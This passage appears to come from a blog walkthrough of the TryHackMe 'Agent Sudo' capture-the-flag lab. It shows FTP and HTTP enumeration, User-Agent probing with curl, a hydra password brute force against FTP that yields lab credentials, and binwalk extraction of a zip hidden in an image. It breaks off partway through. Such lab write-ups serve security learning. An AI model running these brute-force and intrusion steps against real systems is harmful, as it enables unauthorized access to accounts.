Open <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>:</span><span style=color:#ae81ff>21</span>
Open <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>:</span><span style=color:#ae81ff>22</span>
Open <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>:</span><span style=color:#ae81ff>80</span>

<span style=color:#f92672>.</span>
</code></pre></div><h3 id=ftp---port-21>FTP - Port 21<a hidden class=anchor aria-hidden=true href=#ftp---port-21>#</a></h3><p>Checking the <strong>FTP port</strong>, connecting to it, trying <code>anonymous user</code>, didn&rsquo;t work out!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ftp <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span>           
Connected to <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>.</span>
<span style=color:#a6e22e>220</span> <span style=color:#f92672>(</span>vsFTPd <span style=color:#ae81ff>3.0</span><span style=color:#f92672>.</span><span style=color:#a6e22e>3</span><span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>:</span>root<span style=color:#f92672>):</span> anonymous
<span style=color:#ae81ff>331</span> Please specify the password<span style=color:#f92672>.</span>
Password:
<span style=color:#ae81ff>530</span> Login incorrect<span style=color:#f92672>.</span>
Login failed<span style=color:#f92672>.</span>
ftp<span style=color:#f92672>&gt;</span> 
<span style=color:#ae81ff>221</span> Goodbye<span style=color:#f92672>.</span>
</code></pre></div><hr><h3 id=http---port-80>HTTP - Port 80<a hidden class=anchor aria-hidden=true href=#http---port-80>#</a></h3><p>Let&rsquo;s check what&rsquo;s <strong>hosted</strong> on the <code>HTTP host</code>.</p><p><img loading=lazy src=/images/thm-agent_sudo/Untitled.png alt></p><p>Nothing much, let&rsquo;s follow what&rsquo;s told in the page maybe? Let&rsquo;s try passing the <code>User-Agent</code> header in <code>request</code>.</p><p>Let&rsquo;s try the agent <strong>R</strong> given in the page as <code>user-agent</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> curl <span style=color:#f92672>-</span>i <span style=color:#f92672>-</span>X GET http<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.107.2/ -H &#39;User-Agent: R&#39;
</span><span style=color:#75715e></span>HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> OK
Date: Sat<span style=color:#f92672>,</span> <span style=color:#ae81ff>17</span> Apr <span style=color:#ae81ff>2021</span> <span style=color:#ae81ff>18</span><span style=color:#f92672>:</span><span style=color:#ae81ff>45</span><span style=color:#f92672>:</span><span style=color:#ae81ff>28</span> GMT
Server: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>29</span> <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
Vary: Accept<span style=color:#f92672>-</span>Encoding
Content<span style=color:#f92672>-</span>Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>310</span>
Content<span style=color:#f92672>-</span>Type<span style=color:#f92672>:</span> text<span style=color:#f92672>/</span>html<span style=color:#f92672>;</span> charset<span style=color:#f92672>=</span>UTF<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>

What are you doing<span style=color:#f92672>!</span> Are you one of the <span style=color:#ae81ff>25</span> employees<span style=color:#f92672>?</span> If not<span style=color:#f92672>,</span> I going to report <span style=color:#66d9ef>this</span> incident
<span style=color:#f92672>&lt;!</span>DocType html<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>html<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>head<span style=color:#f92672>&gt;</span>
        <span style=color:#f92672>&lt;</span>title<span style=color:#f92672>&gt;</span>Annoucement<span style=color:#f92672>&lt;/</span>title<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span>head<span style=color:#f92672>&gt;</span>

<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>body</span><span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>p<span style=color:#f92672>&gt;</span>
        Dear agents<span style=color:#f92672>,</span>
        <span style=color:#f92672>&lt;</span>br<span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
        Use your own <span style=color:#f92672>&lt;</span>b<span style=color:#f92672>&gt;</span>codename<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;</span> as user<span style=color:#f92672>-</span>agent to access the site<span style=color:#f92672>.</span>
        <span style=color:#f92672>&lt;</span>br<span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
        From<span style=color:#f92672>,&lt;</span>br<span style=color:#f92672>&gt;</span>
        Agent R
<span style=color:#f92672>&lt;/</span>p<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span><span style=color:#66d9ef>body</span><span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span>html<span style=color:#f92672>&gt;</span>
</code></pre></div><blockquote><p>What are you doing! Are you one of the 25 employees? If not, I going to report this incident</p></blockquote><p>Alright, that&rsquo;s one thing, maybe try <code>enumerating</code> this manually for <code>3-4 alphabets</code> starting from <code>A</code>? If nothing&rsquo;s found, let&rsquo;s continue writing a <code>for loop</code> to automate this.</p><p>Visiting with <code>User-Agent: C</code> we get another header in the page: <code>Location</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> curl <span style=color:#f92672>-</span>i <span style=color:#f92672>-</span>X GET http<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.107.2/ -H &#39;User-Agent: C&#39;
</span><span style=color:#75715e></span>HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>302</span> Found
Date: Sat<span style=color:#f92672>,</span> <span style=color:#ae81ff>17</span> Apr <span style=color:#ae81ff>2021</span> <span style=color:#ae81ff>18</span><span style=color:#f92672>:</span><span style=color:#ae81ff>47</span><span style=color:#f92672>:</span><span style=color:#ae81ff>04</span> GMT
Server: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>29</span> <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
Location: agent_C_attention<span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
Content<span style=color:#f92672>-</span>Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>218</span>
Content<span style=color:#f92672>-</span>Type<span style=color:#f92672>:</span> text<span style=color:#f92672>/</span>html<span style=color:#f92672>;</span> charset<span style=color:#f92672>=</span>UTF<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>

<span style=color:#f92672>&lt;!</span>DocType html<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>html<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>head<span style=color:#f92672>&gt;</span>
        <span style=color:#f92672>&lt;</span>title<span style=color:#f92672>&gt;</span>Annoucement<span style=color:#f92672>&lt;/</span>title<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span>head<span style=color:#f92672>&gt;</span>

<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>body</span><span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;</span>p<span style=color:#f92672>&gt;</span>
        Dear agents<span style=color:#f92672>,</span>
        <span style=color:#f92672>&lt;</span>br<span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
        Use your own <span style=color:#f92672>&lt;</span>b<span style=color:#f92672>&gt;</span>codename<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;</span> as user<span style=color:#f92672>-</span>agent to access the site<span style=color:#f92672>.</span>
        <span style=color:#f92672>&lt;</span>br<span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
        From<span style=color:#f92672>,&lt;</span>br<span style=color:#f92672>&gt;</span>
        Agent R
<span style=color:#f92672>&lt;/</span>p<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span><span style=color:#66d9ef>body</span><span style=color:#f92672>&gt;</span>
<span style=color:#f92672>&lt;/</span>html<span style=color:#f92672>&gt;</span>
</code></pre></div><blockquote><p>Location: agent_C_attention.php</p></blockquote><p>Visiting the <code>page</code>, we get:</p><p><img loading=lazy src=/images/thm-agent_sudo/Untitled%201.png alt></p><p>Alright, we get two usernames from this page: <code>J</code> and <code>chris</code>. Tried <code>J</code> as <code>User-Agent</code> in the <code>request</code>, nothing really happened!</p><p>Maybe we&rsquo;re supposed to <code>bruteforce</code> these <code>credentials</code>? Let&rsquo;s try that against the <strong>FTP port</strong> since we weren&rsquo;t able to use anonymous user before!</p><h3 id=bruteforcing-port-21---ftp>Bruteforcing Port 21 - FTP<a hidden class=anchor aria-hidden=true href=#bruteforcing-port-21---ftp>#</a></h3><p>Let&rsquo;s use <code>hydra</code> against the host with <code>rockyou.txt</code> wordlist. <strong>We get the results in 2-3 minutes!</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> hydra <span style=color:#f92672>-</span>l chris <span style=color:#f92672>-</span>P <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>rockyou<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span> <span style=color:#f92672>-</span>s <span style=color:#ae81ff>21</span> ftp <span style=color:#f92672>-</span>t <span style=color:#ae81ff>16</span>                                                                                                                           <span style=color:#ae81ff>130</span> <span style=color:#960050;background-color:#1e0010>â¨¯</span>
Hydra v9<span style=color:#f92672>.</span><span style=color:#a6e22e>1</span> <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser<span style=color:#f92672>/</span>THC <span style=color:#f92672>&amp;</span> David Maciejak <span style=color:#f92672>-</span> Please <span style=color:#66d9ef>do</span> not use <span style=color:#66d9ef>in</span> military or secret service organizations<span style=color:#f92672>,</span> or <span style=color:#66d9ef>for</span> illegal <span style=color:#a6e22e>purposes</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span> <span style=color:#66d9ef>is</span> non<span style=color:#f92672>-</span>binding<span style=color:#f92672>,</span> these <span style=color:#f92672>***</span> ignore laws and ethics anyway<span style=color:#f92672>).</span>

Hydra <span style=color:#f92672>(</span>https<span style=color:#f92672>:</span><span style=color:#75715e>//github.com/vanhauser-thc/thc-hydra) starting at 2021-04-17 23:50:24
</span><span style=color:#75715e></span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server<span style=color:#f92672>,</span> overall <span style=color:#ae81ff>16</span> tasks<span style=color:#f92672>,</span> <span style=color:#ae81ff>14344399</span> login <span style=color:#a6e22e>tries</span> <span style=color:#f92672>(</span>l<span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>p<span style=color:#f92672>:</span><span style=color:#ae81ff>14344399</span><span style=color:#f92672>),</span> <span style=color:#f92672>~</span><span style=color:#ae81ff>896525</span> tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ftp<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.107.2:21/
</span><span style=color:#75715e></span><span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> <span style=color:#ae81ff>152.00</span> tries<span style=color:#f92672>/</span>min<span style=color:#f92672>,</span> <span style=color:#ae81ff>152</span> tries <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>01</span>h<span style=color:#f92672>,</span> <span style=color:#ae81ff>14344247</span> to <span style=color:#66d9ef>do</span> <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>1572</span><span style=color:#f92672>:</span><span style=color:#ae81ff>51</span>h<span style=color:#f92672>,</span> <span style=color:#ae81ff>16</span> active
<span style=color:#f92672>[</span><span style=color:#ae81ff>21</span><span style=color:#f92672>][</span>ftp<span style=color:#f92672>]</span> host<span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span>   login<span style=color:#f92672>:</span> chris   password<span style=color:#f92672>:</span> crystal
<span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed<span style=color:#f92672>,</span> <span style=color:#ae81ff>1</span> valid password found
<span style=color:#a6e22e>Hydra</span> <span style=color:#f92672>(</span>https<span style=color:#f92672>:</span><span style=color:#75715e>//github.com/vanhauser-thc/thc-hydra) finished at 2021-04-17 23:52:12
</span></code></pre></div><p>Alright, <code>chris:crsytal</code> are the credentials of <code>FTP</code>, let&rsquo;s connect and see what&rsquo;s in there for us.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ftp <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span>
Connected to <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>.</span>
<span style=color:#a6e22e>220</span> <span style=color:#f92672>(</span>vsFTPd <span style=color:#ae81ff>3.0</span><span style=color:#f92672>.</span><span style=color:#a6e22e>3</span><span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>107</span><span style=color:#f92672>.</span><span style=color:#a6e22e>2</span><span style=color:#f92672>:</span>root<span style=color:#f92672>):</span> chris
<span style=color:#ae81ff>331</span> Please specify the password<span style=color:#f92672>.</span>
Password:
<span style=color:#ae81ff>230</span> Login successful<span style=color:#f92672>.</span>
Remote system type <span style=color:#66d9ef>is</span> UNIX<span style=color:#f92672>.</span>
Using binary mode to transfer files<span style=color:#f92672>.</span>
ftp<span style=color:#f92672>&gt;</span> ls
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Here comes the directory listing<span style=color:#f92672>.</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>217</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>           <span style=color:#ae81ff>33143</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>           <span style=color:#ae81ff>34842</span> Oct <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
<span style=color:#ae81ff>226</span> Directory send OK<span style=color:#f92672>.</span>
ftp<span style=color:#f92672>&gt;</span> get To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
local: To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> remote<span style=color:#f92672>:</span> To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>217</span> bytes<span style=color:#f92672>).</span>
<span style=color:#ae81ff>226</span> Transfer complete<span style=color:#f92672>.</span>
<span style=color:#ae81ff>217</span> bytes received <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>0.00</span> <span style=color:#a6e22e>secs</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>211.2802</span> kB<span style=color:#f92672>/</span>s<span style=color:#f92672>)</span>
ftp<span style=color:#f92672>&gt;</span> get cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span>
local: cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span> remote<span style=color:#f92672>:</span> cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span>
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>33143</span> bytes<span style=color:#f92672>).</span>
<span style=color:#ae81ff>226</span> Transfer complete<span style=color:#f92672>.</span>
<span style=color:#ae81ff>33143</span> bytes received <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>0.30</span> <span style=color:#a6e22e>secs</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>107.2144</span> kB<span style=color:#f92672>/</span>s<span style=color:#f92672>)</span>
ftp<span style=color:#f92672>&gt;</span> get cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
local: cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span> remote<span style=color:#f92672>:</span> cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span>
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>34842</span> bytes<span style=color:#f92672>).</span>
<span style=color:#ae81ff>226</span> Transfer complete<span style=color:#f92672>.</span>
<span style=color:#ae81ff>34842</span> bytes received <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>0.32</span> <span style=color:#a6e22e>secs</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>106.3596</span> kB<span style=color:#f92672>/</span>s<span style=color:#f92672>)</span>
</code></pre></div><p>Let&rsquo;s go through the contents!</p><p>The <code>.txt</code> file contains:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> cat To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
Dear agent J<span style=color:#f92672>,</span>

All these alien like photos are fake<span style=color:#f92672>!</span> Agent R stored the <span style=color:#66d9ef>real</span> picture inside your directory<span style=color:#f92672>.</span> Your login password <span style=color:#66d9ef>is</span> somehow stored <span style=color:#66d9ef>in</span> the fake picture<span style=color:#f92672>.</span> It shouldn<span style=color:#960050;background-color:#1e0010>&#39;</span>t be a problem <span style=color:#66d9ef>for</span> you<span style=color:#f92672>.</span>

From<span style=color:#f92672>,</span>
Agent C
</code></pre></div><p><strong>Checking file types:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> file <span style=color:#f92672>*</span>                    
cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span><span style=color:#f92672>:</span> JPEG image data<span style=color:#f92672>,</span> JFIF standard <span style=color:#ae81ff>1.01</span><span style=color:#f92672>,</span> resolution <span style=color:#f92672>(</span>DPI<span style=color:#f92672>),</span> density <span style=color:#ae81ff>96</span>x96<span style=color:#f92672>,</span> segment length <span style=color:#ae81ff>16</span><span style=color:#f92672>,</span> baseline<span style=color:#f92672>,</span> precision <span style=color:#ae81ff>8</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>440</span>x501<span style=color:#f92672>,</span> components <span style=color:#ae81ff>3</span>
cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span><span style=color:#f92672>:</span>      PNG image data<span style=color:#f92672>,</span> <span style=color:#ae81ff>528</span> x <span style=color:#ae81ff>528</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>8</span><span style=color:#f92672>-</span>bit colormap<span style=color:#f92672>,</span> non<span style=color:#f92672>-</span>interlaced
To_agentJ<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#f92672>:</span>  ASCII text
</code></pre></div><p>I think we&rsquo;re now supposed to find stuff inside the images! Little bit of <strong>steganography</strong>?</p><hr><h3 id=finding-contents-inside-the-images>Finding contents inside the images<a hidden class=anchor aria-hidden=true href=#finding-contents-inside-the-images>#</a></h3><p>Running <code>binwalk</code> on the <code>two images</code>, we get:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> binwalk cute<span style=color:#f92672>-</span>alien<span style=color:#f92672>.</span><span style=color:#a6e22e>jpg</span> 

DECIMAL       HEXADECIMAL     DESCRIPTION
<span style=color:#f92672>--------------------------------------------------------------------------------</span>
<span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>0x0</span>             JPEG image data<span style=color:#f92672>,</span> JFIF standard <span style=color:#ae81ff>1.01</span>

                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> binwalk cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span> 

DECIMAL       HEXADECIMAL     DESCRIPTION
<span style=color:#f92672>--------------------------------------------------------------------------------</span>
<span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>0x0</span>             PNG image<span style=color:#f92672>,</span> <span style=color:#ae81ff>528</span> x <span style=color:#ae81ff>528</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>8</span><span style=color:#f92672>-</span>bit colormap<span style=color:#f92672>,</span> non<span style=color:#f92672>-</span>interlaced
<span style=color:#ae81ff>869</span>           <span style=color:#ae81ff>0x365</span>           Zlib compressed data<span style=color:#f92672>,</span> best compression
<span style=color:#ae81ff>34562</span>         <span style=color:#ae81ff>0x8702</span>          Zip archive data<span style=color:#f92672>,</span> encrypted compressed size<span style=color:#f92672>:</span> <span style=color:#ae81ff>98</span><span style=color:#f92672>,</span> uncompressed size<span style=color:#f92672>:</span> <span style=color:#ae81ff>86</span><span style=color:#f92672>,</span> name<span style=color:#f92672>:</span> To_agentR<span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span>
<span style=color:#ae81ff>34820</span>         <span style=color:#ae81ff>0x8804</span>          End of Zip archive<span style=color:#f92672>,</span> footer length<span style=color:#f92672>:</span> <span style=color:#ae81ff>22</span>
</code></pre></div><p>Cutie.png is what we need! Let&rsquo;s extract the <code>zip</code> file from the image.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x<span style=color:#f92672>)-[/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Agent Sudo<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> binwalk <span style=color:#f92672>-</span>e cutie<span style=color:#f92672>.</span><span style=color:#a6e22e>png</span> 

DECIMAL       HEXADECIMAL     DESCRIPTION
<span style=color:#f92672>--------------------------------------------------------------------------------</span>
<span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>0x0</span>             PNG image<span style=color:#f92672>,</span> <span style=color:#ae81ff>528</span> x <span style=color:#ae81ff>528</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>8</span><span style=color:#f92672>-</span>bit colormap<span style=color:#f92672>,</span> non<span style=color:#f92672>-</span>interlaced
<span style=color:#ae81ff>869</span>           <span style=color:#ae81ff>0x365</span>           Zlib compressed data<span style=color:#f92672>,</span> best compression
